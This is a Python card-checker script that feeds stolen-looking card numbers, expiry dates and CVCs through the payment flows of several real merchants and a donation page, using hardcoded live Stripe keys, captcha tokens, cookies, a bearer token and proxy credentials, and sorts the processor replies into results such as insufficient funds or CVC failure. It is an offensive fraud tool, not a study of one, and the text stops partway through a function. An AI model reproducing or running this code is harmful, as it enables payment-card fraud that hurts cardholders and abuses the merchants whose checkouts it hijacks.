import requests
import re
import random
import time
import string,json
import base64,user_agent,flagz
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import pycountry,jwt
username = "65dipmhvxcjkrxr"
password = "z9awe4tos2xeowa"
proxy = "rp.proxyscrape.com:6060"
proxy = {"http":"http://{}:{}@{}".format(username, password, proxy)}
def vip(card_data):
	import requests
	ua = UserAgent()
	rua = ua.random
	card_data = card_data.split('|')
	n = card_data[0]
	mm = card_data[1]
	yy = card_data[2]
	cvc = card_data[3]
	if len(yy) == 2:
		yy = f'20{yy}'
	else:
	   yy = card_data[2]
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'time_on_page=18297&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=dcb67eec-1d69-42f5-9355-7243b2b78808f1bd8f&sid=8f79f1a0-73e4-4cf0-81e8-161b254f1130f1edcb&key=pk_live_51CTrxFJGbMz6kgJijIfhMZYDGIF2QWOcZJXwgG0WwQ6WoE9Jyle3CBtGqNOB2tX1yv2BrhqJG0G1IT2DMrUBNuUO00jrTq1PDh&payment_user_agent=stripe.js%2F78ef418&card[number]={n}&card[exp_month]={mm}&card[exp_year]={yy}&card[name]=fdgd+dfhygfd&card[address_line1]=fdhgdtrf&card[address_city]=sertresd&card[address_state]=ewtsd&card[address_zip]=46535&card[address_country]=BS'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return(response.json()['error']['message'])
	headers = {
	    'authority': 'scraperapi.chargebee.com',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': 'Bearer 252ed58dd3b7b9f098de3642e992c486',
	    'content-type': 'application/json',
	    'origin': 'https://js.chargebee.com',
	    'referer': 'https://js.chargebee.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'cardBillingAddress': {
	        'firstName': 'fdgd',
	        'lastName': 'dfhygfd',
	        'addressLine1': 'fdhgdtrf',
	        'city': 'sertresd',
	        'state': 'ewtsd',
	        'countryCode': 'BS',
	        'zip': '46535',
	    },
	    'billingAddress': {
	        'firstName': 'fdgd',
	        'lastName': 'dfhygfd',
	        'addressLine1': 'fdhgdtrf',
	        'city': 'sertresd',
	        'state': 'ewtsd',
	        'countryCode': 'BS',
	        'zip': '46535',
	    },
	    'customerBillingAddress': {
	        'firstName': 'dfgdfgfd',
	        'lastName': 'dfrtgy',
	        'addressLine1': 'RDT Field Office Road',
	        'city': 'Uravakonda',
	        'state': 'Andhra Pradesh',
	        'stateCode': 'AP',
	        'countryCode': 'IN',
	        'zip': '515812',
	    },
	    'customer': {
	        'firstName': 'dfgdfgfd',
	        'lastName': 'dfrtgy',
	        'email': 'visaspam77@gmail.com',
	    },
	    'tmpToken': id,
	    'reattempt': True,
	    'recaptchaToken': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQPsnVIZ3qUyaMwUfEUWqQATp40i0t7NFYpdjJ6EuZnHUNEN-tmoVREjppzv_9gO1hlo4UAp0jsmTYTS_CG2za4jiCITFUA4n3opUDs0PBL7H9H1UEdYvHXgRbAovlQzx1kd_5Iyj8T-VW6E8pfKfnyUBHMvLQX1qFf0tBG5VlIgwNoAHmJX0dJnCB0R1mStEHRTFn-xsWJJ0cIqy9pceUZeZv9S8LlosTmQ9TdV96ymnloc3qpFEsolWl33_G1-3ejv5nfEU9nC3DOFn-AcAGAxVDANRzcEENkezELzYnCRqO2FhIvQ0e3HHoE479aVqw3TwQye_lJ2VWGlvGbYcmoONPIV3wu4DOtwE0fUCnFejMfQqhYO-azEfs3IKv5lw3TLPWSxc9opQDhqnch8IF4oGiO6nF9ZQiMsnfh7F5oSIuPy1FLNEUrTegpcy0NppsFlqTm93cGg6O4B4NMCD2WL9G4x_Tgv4eWe06bb1t8t7HB6zHdjtWIy48E7FwXX3_cCpyEw7c3EdrmUxbWKO1F7YP0G-pFKkxkOxecsvmlZ-ejjDIUIAclR1CEcK7iosf4C9znHjgpqu6wTJ3giCqE36CRqBAUTbCZtU4UGRFnVrJgmogGv5sOdX5wkvtSmtq5ZRaBXiVMIJIkO2HPKtYsNflkLZ8wfhn1xPGD5dcJ3KGSIJs_yWhqO99mTTQsU5ofPQb1rG8qDwbH--PfkAosVr6IQiSwU9JrO2c9zR0I5MvwC_XOYxPwfELPZwipAIwbEpjwZGrJRRNm5HPfc_CiUAZbyX4Arrr4CcaKHQ2EWKQQ2M4lDuui3nW4BR2muGY0QA7SdA-MxFpxH0pT0kowXBY9XsPpYNKOeyykfYmD_V_bP5taRjrrHBO4ccvPK3t2A6tF6tKgo_IEhQbK7ka2F_3WMQVRxLLgogM2R6aEH_WWsNfnZuKUMVb6rnF4v2Vb1Z2SCkWNwebMnsWcua3TqcE0eqeYdwaCaAcBfMvcPhp-J38pPFNasEB-9Ddt8SMr6Ih066R-7umTscL9vT2KS-mEQlgtVeQUFO1gtLedBOWdWAJN36xv5ERAPx8LnDkkm1VrS18plq9v4WSQbsah9okSXXzLTpzJh6vC-U14eb8Ea71pgobaw-Jwxh0A4JmrM823K1eINCIeMt5VM1S_lIlJMl4TzJiwDyJDTNYhy1HsgmI-GFpdbEgj_G6PGdnQkaIpA0dFBKuUF18ArvJphLJMkfSJNFSiY-NJJLzTvbvv-zcr-2ZCP5wy7hg1LUniCIq_PqMNV5wCanU27EKxsbby8qmenf5nf1xXhura2krTOBeAfVbn5SXpy4zyjZXhwzmY3iH-oc2hhcmRfaWTOMa1MgaJrcqgyYmFmZjgxMqJwZAA.KUBM4NXhm1rdcqYKEk3pjpEhNlnmUM9ldu08qhNj6sI',
	}
	
	response = requests.post(
	    'https://scraperapi.chargebee.com/api/internal/payment_intents/confirm',
	    headers=headers,
	    json=json_data,
	)
	return(response.json()['payment_intent']['active_payment_attempt']['error_detail']['error_message'])
def stc(card_data):
	import requests
	ua = UserAgent()
	rua = ua.random
	card_data = card_data.split('|')
	n = card_data[0]
	mm = card_data[1]
	yy = card_data[2]
	cvc = card_data[3]
	if len(yy) == 2:
		yy = f'20{yy}'
	else:
	   yy = card_data[2]
	
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[address][postal_code]=97232&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=3bd309e1-43c0-4190-9cd2-07fa077f1b1b9ccfe3&muid=8434f1d9-e441-4a0f-af2d-5a3cd64d140eb2e887&sid=396463d9-b232-417c-be06-3b3dd406eb0f32e792&payment_user_agent=stripe.js%2Ffe2e2c5c10%3B+stripe-js-v3%2Ffe2e2c5c10%3B+split-card-element&referrer=https%3A%2F%2Fgalleryclimatecoalition.org&time_on_page=37574&key=pk_live_OC4ftTyuGNtAcLvMnh7Fz889&_stripe_account=acct_1HaHgQGvI1equNqy&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZnfufykV9x6B9FLIDpIBupzET688WFC2BlZ9Fvydwgk0J6T-wM2wcX7QalmxJe1e4O2HFYaPXZKNixidN74Wr4Qy1POoUIGOv1yotDLYKoP6Uw89qjVwy75pGXVckKi8Fzh3oZ4ipVlcQaRNp-2g0AAe4cUAJ6TFsm020swcy28vzBHfdOD1pAhKnPRWMCwG9t5CeFSYdUcKY99bVvNCzdSGydy_qjlzUCdCCkF70ugUB-OuTQ2nAmMlZMSBxlPPU5YtLuhQQQhsL3IB4EPumqNsZH2bLWGJoLBpx2uVWwaFl7RtidXCMBVCNPuk_jyYy0-U9YRDPjkAnDMuYoWPwWFzl91A25-idYHSJ12s8Ofm4107rEJOny8KRbfVWPJEkLphPii-wsRl_gVPlz03pOYOe5UWw0PR6Q8GRRjka5nI73jo6JmeBJXK86LKnPLGSB3DFAAMrKyxbZHhCos5uFxqL9vp5GzNdSOKItMOxbAgTEyR6u7M8zqWLmOtSNfIlyvSB7IltHk28BcPd1X4bpHwzMIEu_5EQtCfEHHKMbyJJI79dYBiDhFKIlkETLqQStSYd_Z1AS5HTtxBEyNaJHdIir2_0TPhJXS_Fm7yV3Oi--NjdM5ePSxaeQUZFgjpu4J45bXPaKDoUF_nCR8_bo60ZQFqqNRA9laa6XzgL6ovL5Q5gCUPcXfjC7G3riOJdRAg0IWRglgiEjbYlg0ZB5-PtyODxMXUF_DCngNdIOty-EHBbWGk3jKtGkHIHeM43M9rYJ4krOdxGb9bwex80GHNfj12HBsiN3pnbt7TvMDtc54cRnHrz2iIZvE9Zbc87ILTXemSfEZvqbcPR8O7jT9xBXVLwfFvZqPv66p68UupQtU2XVq6qNTlnnyAnVQ64AVe4IEX2OB4AWCEF1MQ67egBjGlcBvBz8m2PRuVOYBeRf-2sKmW6NEs6Ht5IWz7oJ590c-USlRiCnGIaqWpELT-KGmtkhI1IX0o4u1RVH5EJFm9n1yF-lHbMj7C2Ma-WNVqsgoL9D49O136ZOUrnKLuE0coSHeQD424nqkIEzD3BXO-xEG71zauwNP4OjniCYZLmV6bVORifWAZT_wGhisje_G0BEHM7EnwO_5epC5CEqw9xo8-bL2JNDhBPGtiYzwuP41GE8vr1Tl6yssgNFfuYhEGSmprdwLFuHwd_XVxzJxs12JEzOpeXgKJIokjMi2a-OVI7h6zdJtRK3bXuaHoq7kLL3Rm_GwY8XD0-e_MVxrYIgVvUf6OG_etcOD9tyPIFgx9pIs_6pjJHLFdhLWWvBDkoCpEgtsPqn9syWedJg2V6unBgI3xyu63pgjdp16JZvBf1kLWPOQjQp8u34M3iDIrqpaGuJjXRGKLcPWFA5nAUqt0ZZlsGOtSIpYsqPTEddyJO143nXQHGTqRRIBNSQ4wh_8rE5yuJTNCUQTepFQiG-_bs3WoDhM2ueXZpv7oKLXDmCkc8i7EJK98laCnDpYhKmKg0CF5mDAg6DVVfxVCeifKI-OiipFJFxQssigslapxG4SXGOJVCyh-c75_I9sB3COtxvzhXSgL2LRKAsA1tpwnFVD8hfGYN_AtjD6Nt78S6gVrIwkzyY7CzTpnGNRwZfsi0QXmAgbTi_nAmCI12hpKQ6gx9oSBfn1LA8F1DUJATroLQlnVGtA056BXPsB_U5nFx0_4Zm_Qni-YSvh4rqG6udmrQmDvG3ccbYQIEhPazYBlCya3crsLWrBkt8SzJcMj-NxyYdOhBTgOcfftPr8xon-koohfEISuLQ9pijdMm8CR5Oe3dERzeT7-W49dVt11DrQAoVpgWXrUAk3LcGEO5b050b_YcQ8YZenTUs4XgA26O2Egd4BKl_HAEXNfRJR5qFhF8I4-E8kudgVh4l5Vzp3AMECPBEkVrcKtC5R2pR26D7LcA4fHPmyTrcYfgs2XHeol2W0aIYEiDIDcYU7xeXt1XEwZhIIPKKaPFLtNK7OCGZ9G4YfuKe3-ia828HPff0PEgYFgbNghNG-T6EsF5xq2UWvxUm9Poud1UV60LkeI7g822NiPctDxZpeo5xzHuk_pof2p9vnkFjwtrnD8naZd6eTxtwAlK5okURaRikQbY2bgUZdtb926Fn82pIOTdT97FgeQQ0If5-ua3N5gTbDuEjkC0mh-P4KfPbx_TeGaNleHDOZosgzahzaGFyZF9pZM4DMYNvomtyqDFhZmQxZTRjonBkAA.c787TIRh4w61mmL_b8mXstzFj8e8L2J5V1oz32Ztm7U'

	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return(response.json()['error']['message'])
	cookies = {
    'gcc': '86d4822d07b0334a4c067ad1c431a85c947b0c201b7751d66d9042f0beec68defda58bf8',}
	headers = {
    'authority': 'galleryclimatecoalition.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://galleryclimatecoalition.org',
    'referer': 'https://galleryclimatecoalition.org/store/basket/?checkout-step=3',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',}

	
	data = {
    'payment_method_id': id,
    'payment': all_response,
    'proxy_dir': '',
    '_cmspreview': '',}
	
	response = requests.post(
    'https://galleryclimatecoalition.org/cart/stripe_create_confirm_payment_intent/',
    cookies=cookies,
    headers=headers,
    data=data,)
	return(response.json()['payment_intent']['active_payment_attempt']['error_detail']['error_message'])
def pay(card_data):
	session = requests.Session()
	ua = UserAgent()
	rua = ua.random
	card_data = card_data.split('|')
	num = card_data[0]
	mon = card_data[1]
	year = card_data[2]
	cvv = card_data[3]
	if len(year) == 2:
		year = f'20{year}'
	else:
	   year = card_data[2]	
	card = f"{num}|{mon}|{year}|{cvv}"
	last4 = num[-4:]
	if num.startswith("4"):
		card_brand = "Visa"
	elif num.startswith("5"):
		card_brand = "MasterCard"
#——————————————————————#
	headers = {
	'authority': 'metager.org',
	'accept': '*/*',
	'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'referer': 'https://metager.org/spende/1/once/paypal/card',
	'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
	'sec-ch-ua-mobile': '?1',
	'sec-ch-ua-platform': '"Android"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-origin',
	'user-agent': rua,
}

	response1 = requests.get('https://metager.org/spende/1/once/paypal/card/order', headers=headers,proxies=proxy)
	iD = response1.json()["id"]
	print(iD)
	
	if len(iD) != 17:
		process_card_p(card_data)
#——————————————————————#
	response = requests.get('https://metager.org/spende/5/once/paypal/card',proxies=proxy)
	
	value_start = response.text.find('<input type="hidden" name="client-token" value="') + len('<input type="hidden" name="client-token" value="')
	value_end = response.text.find('">', value_start)
	value = response.text[value_start:value_end]
	
	decoded_value = base64.b64decode(value).decode('utf-8')
	
	json_decoded = json.loads(decoded_value)
	
	accs = (json_decoded["paypal"]["accessToken"])
	headers = {
	'authority': 'cors.api.paypal.com',
	'accept': '*/*',
	'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'authorization': f"Bearer {accs}",
	'braintree-sdk-version': '3.32.0-payments-sdk-dev',
	'content-type': 'application/json',
	'origin': 'https://assets.braintreegateway.com',
	'paypal-client-metadata-id': 'b48dd81b0e228e04cc95b3351723794e',
	'referer': 'https://assets.braintreegateway.com/',
	'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
	'sec-ch-ua-mobile': '?1',
	'sec-ch-ua-platform': '"Android"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'cross-site',
	'user-agent': rua,
}
	json_data = {
	'payment_source': {
		'card': {
			'number': num,
			'expiry': f'{year}-{mon}',
			'security_code': cvv,
			'attributes': {
				'verification': {
					'method': 'SCA_WHEN_REQUIRED',
				},
			},
		},
	},
	'application_context': {
		'vault': False,
	},
}
	
	response = requests.post(
	f'https://cors.api.paypal.com/v2/checkout/orders/{iD}/confirm-payment-source',
	headers=headers,
	json=json_data,
	proxies=proxy
)
	if "PAYER_ACTION_REQUIRED" in response.text:  
		msg_text = "3D Authentication"
		return msg_text
	elif "PAYER_CANNOT_PAY" in response.text:
		msg_text = "PAYER_CANNOT_PAY"
		return msg_text
	else:pass
#———–———–———–———–———–———#
	headers = {
	'authority': 'metager.org',
	'accept': '*/*',
	'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'content-type': 'application/json',
	'origin': 'https://metager.org',
	'referer': 'https://metager.org/spende/1/once/paypal/card',
	'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
	'sec-ch-ua-mobile': '?1',
	'sec-ch-ua-platform': '"Android"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-origin',
	'user-agent': rua,
}

	json_data = {
	'orderID': iD,
	}
#———–———–———–———–———–———#
	response2 = requests.post('https://metager.org/spende/1/once/paypal/card/order', headers=headers, json=json_data,proxies=proxy)
	response_code = "un"
	try:
		response_code = response2.json()["purchase_units"][0]["payments"]["captures"][0]["processor_response"]["response_code"]
		if response_code.startswith("PP"):
			pay(card_data)
		else:pass
	except:pass
	response_map = {
	"5120": "Insufficient funds",
	"0500": "Card refused",
	"9500": "Fraudulent card",
	"5400": "Card expired",
	"5180": "Luhn Check fails",
	"9520": "Card lost, stolen",
	"1330": "Card not valid",
	"5100": "Card is declined",
	"00N7": "Cvc Check Fails",
	"0580": "Declined by credit institution",
	"un": "Unkwon Response"
}
	try:
		msg_text = response_map[response_code]
		check = True
	except Exception:
		check = False
		msg_text = "Unkwon Response"
	if check:
		if response_code in response_map and response_code != '5120' and response_code != '00N7':
			msg_text = response_map[response_code]
			return msg_text
		elif response_code == "00N7":
			msg_text = response_map[response_code]
			return msg_text
		elif response_code == "5120":
			msg_text = response_map[response_code]
			return msg_text
		if '{"card":{"name"' in response2_text and response_code != "5120" and response_code!= "00N7":
			msg_text = "Thank you very much!"
			return msg_text
	else:
		msg_text='Declined'
		return msg_text
	return f"{msg_text}"
def sa(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	import requests
	headers = {
	    'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=78502b00-c105-497b-a387-9c3a944bf38c9a78ff&muid=364081bf-f4c6-40a6-9f3e-ceb3a006cb11ee9f7b&sid=9b37e0a2-34c6-427e-b190-64c2e3b3ae00cee4ee&payment_user_agent=stripe.js%2Fcb14e00af0%3B+stripe-js-v3%2Fcb14e00af0%3B+card-element&referrer=https%3A%2F%2Fwww.cakethat.ie&time_on_page=22049&key=pk_live_51DVfPMJc3XQZaeeMSapYzPZ1ItEE3JFpyKUrQ1jBkBxgaDQtDtkSOtkuqOCqszJFvjiHt6io4umc30Ub1arAMec100810cTZsc&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiNE5HZjJ2L2FRTGd6VTlDWm01dVFJV1J3d3pvZkZEdys1bklRYnNURTFNTXhDTzloVXpWSU9sR05tdXZEZEd1Snk4WFR0VDJERlpzdXJmTzBYemozRnlEU3VDeDVCa09oL2cyUWNCY2czMHQ0U1ZYR0tSbkpVWkxxeGxwMUxuTU5lc2xBNjBlQm5hdHFlcFdMNGMwSHltYS9obkVaMjkrS1ZVQm1Td0djdmdjNzdWRC9mOGVDM3ZSM0JIUzNza3hPSG5sdm5BM1pMd25WdjNkV251KzM3OGpBQnJkejgyTWFnRjFjSHVhRmkwMmZST2lBVWcya0ZLWEdKQkFlaDZZSHNGckIyOWJrOE5XblRraFMxTDBjUzd6cEdiN0JxdVNZVTBhaEtidTNITENxUkdjcUM2b1VFdWJJTWV4aWhFd0xEd2h3aUd3OFJ2SkRXOUxsVG5jRlVQMElmN1l4SktBSVBlRjdnSmRWWkpyV1RURytzZHRtQjM2Yjk2SWQxV2dMb29tSnhUT0QwNE50aHg2c1kwY2lWNmVmKzh2Q3NkQWE5NHEwdmt0RWRWeVc5bVI0aG5LenRUOVo5M2JZMWhVamxhU0JIbkZ5SXArd1FFVEFNWGpYeUFMUlpFb3VkZXN4cW5nK2RNVlczYk91UmlITVpjM2Q4MEZ2TlBOc3g3QTVwNFoyZzNueEpkZ3VJUjdPYkpWMG85am5yWnBKWFFXR1BtN1laT3JuTklMSHNEZDdTS2hXaFFWVHAvcmRpU2FhcFlyZFJkVGw5TlVUWWt3dktuNWVZYzhFWDlWUFJ0RzAwQTloZWI3RlVXYnBxVk9RL010aXRRQkQ0bUJhWGJMRTNvT1gyZ0RVN1JWWlpoTmhjdmpnMk02Z2E1Z3NLVm1pc0lnenlBbEVGQUhLa2MyTjRrMW9PdjhEeHZVRHJRODllRGtPVVhjSjFwYnVBdXU4dkU2MU1rVWJGbjRBUW9saG0rL3dYMERWOFdKK3orZ0N4Y1pxc2hDMWhYUjhnNUx6c3hoMFdDdHRDYU5OdnlTVjBnQ1hlQWNYU3FBaG1lRDlLMWwyazFvL1dPQ05heTEyQ29uNG9nNy95eGdDUnN0TXdISDZjMGpVUGZvNGQ5bUZNVEFtY0pXSEdySEhpemY3NTJLMVNaUENZL1hwbmF1ZmlMQ25TQWJodCtySUE0dE1KenlvdThTTnIwdlQxbVAwTFVXWkV5ZWxwWFhnT3ZmYjN4ejlIR2s2Q3E3TlJ0Yk5tcFlHQ1JaTUVhdk1EanNNNW9lT0NvQ1NEQ0pWa1VJejZLdmxkbjduTTFqb0dVWlVaYWRFd3BVMmRmdVZvR2pETGk5cGhOaTd1SG0zMjlST2lLbkNNM0tqNUxoTzB3WU1kUGszaWxESUFQb09mK01HV2dacXdQQUprNnBnZ04wV2xzSnRXZVFyQllBbXBaKzUvcWViSWpBdW1kYWtjR1RqTmUvS01RWTE5UDlHT1NXbG1Pc1NiRVpiS3FCK213bWhsR0JCMFJOU1I1bTNoMGR5bU9XTkFVcVhhQXN0VUJIK2JhaXhNN1ZQbWYxR0JTdGJCZ0tyUjhtQ2s0SWVNRWNDWHFoL05MZ2xrMThZWXNWRjhpazdFMlovTmpHSVdIaE5HTEFUWVROcUIzOFE0d3M2R1A3bmxuVis3cFFZaXdUMUdMQ3VEcENvdlE2ZlIra2ZNWEw4b1U3ZDFRYUtGdk05Z2lZUWRtc2dVRGc5UDZmUWFIOEU5Y1V2Z285VitUemNCalIyL1EyOEdjdDFlNnp2ajB4VC9OelJFbWk5UFdZdDRUUWZablBpSDRIUVpyMDg2UWtqZVA5a3Y2RnpyRnJVL3YxY09VK2tIbVBTV2ljdEl5QzRVcFRBY051eXA1UWxCYjZ0VDUvdTVaRElZQlhTVHR0ZnM2WTBPbk5NaVErSEJ6Q3k3d0l3V2JjOE1RcTVKY0NoYUswV1JGdER1c0tEem5Ebytxb05kdEhGUjFCSjA1UWllaUtqZXV1eUZRTWtObWxhRllVcHkwMEVUUlRMejQrVVRhUU56UzRhdXpWN2JuUXVwUnNYcHRWb3lrMnI3ajQrWGN6ZHEwSlZ6aVhWT1J3YklVV0lZVURIWHFoSjN5N0MxOE5MSUR2c0RweXY0ODFXMnlsTHFYSHMwYVMrOE53MTdUa21zcVE1TENrUXZNeElWUE5qTlZwTTZHeVdwc3JyakU1aTMrWTgyVnhZUmpGcEx0cTZINjR6MlFkeExMczV5LzJYSTJoeGppNmJnL2kvK0NmMjJCdnhqTDR5RmV3L3NqRlE0ZjVtRXh1RVYzeDIzRGdwOEdkVDFDdGJoWGpNV21DWjNiUXRUZ3VpR3poTlBXM0JieGNqYTJ4Ny9zSThZWW1hZkFuWHMvVTZQSitwZ01pU1JjOGgzVjd6d25HaXRIRnZNVk9iUGE5OEV3akd3TlNnb29UUzIyejJ6Vm8vNENxM3R4NThFTG8wSHdnQ1V2Q0VicjNHMkV6RHVZd3ZTVEJJY1BOVjlMbm44djNoYzYrcjRGSW9Pc3hUbnpFaThwckFJYjBzYnRKUlZUOEFlbTFIS3BNV2k3TUhoUzJIN08wMkJLZG96a3NScWVXR1d5VXJ0d2wxOW4rNUErUUJvd0pMUHRoOSs1N3YzOUJlNFgyeGRwTDBXVExPNjlSZ1R0UFZtNjJ3U1gxRm15Zk1OTklLL2VFWWdXZzlSaDRwUE12UUQyQm4vM1RWcnUyam5uOGZZbGdhOTlXS1E4RHhMczNmMHRtd3FmKzdaWFZucThlKzNnaitXdk9tVlE5Q1lVaGZ5U0Y4Z2hVZ2RReEdSWTQ3aWlsR1NYT05CTERhdTZadUZFanp4ZHkrUXNIZ3huWjEiLCJleHAiOjE3MjQxODYxNTgsInNoYXJkX2lkIjozMzk1MTAzMDMsImtyIjoiNDJhMDcyZmYiLCJwZCI6MCwiY2RhdGEiOiJhM2tPZUk1NWFWVG9xcEQ5KzF4djk3ei9NTFNJNW5VMlFmNmtmdVhCYlN2cmxTMm5RQjFvQit4K1Qva2pROVVxeXZVemxRL3BtRmdKQWdYNERFZUdSb3Roc3JRSjdzNk93bUw0V1FRRUFwRHdqaC9qTUJ6a1hObDl2NWJQUlhZSDJTbXkzZWtUWTdGSEZLbjY4UFd0R0VlOW5lSWxyOU1EanFwck96R2F0ckJMcG5sWnVQMndwWFBZZTBVcGEzb002aHJ6dU5lVWttSW9Ud3dSIn0.KMZNi1TBtEbka4DyX0ycBl31qKg_yLwiNI0dXjb5z0A'

	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=(response.json()['id'])

	cookies = {
	    'asp_transient_id': '1169ed7fb2990d7a624cc0c89c597b72',
    '__stripe_mid': '364081bf-f4c6-40a6-9f3e-ceb3a006cb11ee9f7b',
    '__stripe_sid': '9b37e0a2-34c6-427e-b190-64c2e3b3ae00cee4ee',
}
	
	headers = {
	    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'asp_transient_id=1169ed7fb2990d7a624cc0c89c597b72; __stripe_mid=364081bf-f4c6-40a6-9f3e-ceb3a006cb11ee9f7b; __stripe_sid=9b37e0a2-34c6-427e-b190-64c2e3b3ae00cee4ee',
    'origin': 'https://www.cakethat.ie',
    'priority': 'u=1, i',
    'referer': 'https://www.cakethat.ie/payment/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	
	params = {
    't': '1724186054547',
}	
	data = {
